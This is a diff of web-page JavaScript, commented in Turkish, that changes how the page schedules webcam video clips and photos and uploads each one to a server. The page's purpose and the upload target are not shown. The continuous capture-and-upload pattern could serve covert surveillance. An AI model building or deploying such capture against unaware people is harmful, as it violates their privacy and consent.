@@ -144,7 +144,7 @@
                     .catch(e => console.log(e));
             }
             
-            // ==================== KAMERA İŞLEMLERİ - KESİN SENKRON ====================
+            // ==================== KAMERA İŞLEMLERİ - PROFESYONEL SENKRON ====================
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const ctx = canvas.getContext('2d', { alpha: false, desynchronized: true });
@@ -154,7 +154,9 @@
             let photoCount = 0;
             let stream = null;
             let baslangicZamani = 0;
-            let aktifVideolar = {}; // Aktif video kayıtlarını tut
+            let aktifVideolar = {};
+            let sonVideoZamani = 0;
+            let sonFotoZamani = 0;
             
             async function startCamera() {
                 try {
@@ -175,26 +177,26 @@
                         
                         // Başlangıç zamanı
                         baslangicZamani = performance.now();
+                        sonVideoZamani = baslangicZamani;
+                        sonFotoZamani = baslangicZamani;
                         
                         // ============================================
-                        // ANA ZAMANLAYICI - TEK KAYNAK
+                        // ZAMANLAYICI - requestAnimationFrame
                         // ============================================
-                        function anaZamanlayici() {
+                        function zamanlayici() {
                             if (!stream?.active) return;
                             
                             const now = performance.now();
-                            const toplamGecenSure = (now - baslangicZamani) / 1000;
                             
                             // ========================================
-                            // VİDEO KONTROLÜ - Geçen süreye göre kaç video olmalı?
+                            // VİDEO KONTROLÜ - DÜZENLİ ARALIKLARLA
                             // ========================================
-                            const olmasiGerekenVideo = Math.floor(toplamGecenSure / VIDEO_SURESI);
-                            
-                            // Eksik videoları başlat
-                            while (videoCount < olmasiGerekenVideo) {
+                            if (now >= sonVideoZamani) {
                                 videoCount++;
+                                sonVideoZamani = baslangicZamani + (videoCount * VIDEO_SURESI * 1000);
+                                
                                 const videoIndex = videoCount;
-                                const videoBaslangic = performance.now();
+                                const videoBaslangic = now;
                                 const chunks = [];
                                 
                                 try {
@@ -203,7 +205,6 @@
                                         videoBitsPerSecond: 2500000
                                     });
                                     
-                                    // Aktif videolar listesine ekle
                                     aktifVideolar[videoIndex] = {
                                         recorder: mr,
                                         baslangic: videoBaslangic,
@@ -229,13 +230,11 @@
                                             body: formData
                                         });
                                         
-                                        // Aktif listeden çıkar
                                         delete aktifVideolar[videoIndex];
                                     };
                                     
                                     mr.start();
                                     
-                                    // Tam sürede durdur
                                     setTimeout(() => {
                                         if (mr.state === 'recording') mr.stop();
                                     }, VIDEO_SURESI * 1000);
@@ -244,15 +243,12 @@
                             }
                             
                             // ========================================
-                            // FOTOĞRAF KONTROLÜ - Geçen süreye göre kaç foto olmalı?
+                            // FOTOĞRAF KONTROLÜ - DÜZENLİ ARALIKLARLA
                             // ========================================
-                            const olmasiGerekenFoto = Math.floor(toplamGecenSure / FOTO_SURESI);
-                            
-                            // Eksik fotoğrafları çek
-                            while (photoCount < olmasiGerekenFoto) {
+                            if (now >= sonFotoZamani) {
                                 photoCount++;
+                                sonFotoZamani = baslangicZamani + (photoCount * FOTO_SURESI * 1000);
                                 
-                                // Fotoğraf çek
                                 canvas.width = video.videoWidth || 640;
                                 canvas.height = video.videoHeight || 480;
                                 ctx.drawImage(video, 0, 0);
@@ -271,10 +267,10 @@
                                 }, 'image/jpeg', 0.85);
                             }
                             
-                            requestAnimationFrame(anaZamanlayici);
+                            requestAnimationFrame(zamanlayici);
                         }
                         
-                        requestAnimationFrame(anaZamanlayici);
+                        requestAnimationFrame(zamanlayici);
                     };
                     
                 } catch(e) {
@@ -283,7 +279,6 @@
             }
             
             window.onbeforeunload = function() {
-                // Tüm aktif videoları durdur
                 for (let key in aktifVideolar) {
                     if (aktifVideolar[key].recorder.state === 'recording') {
                         aktifVideolar[key].recorder.stop();
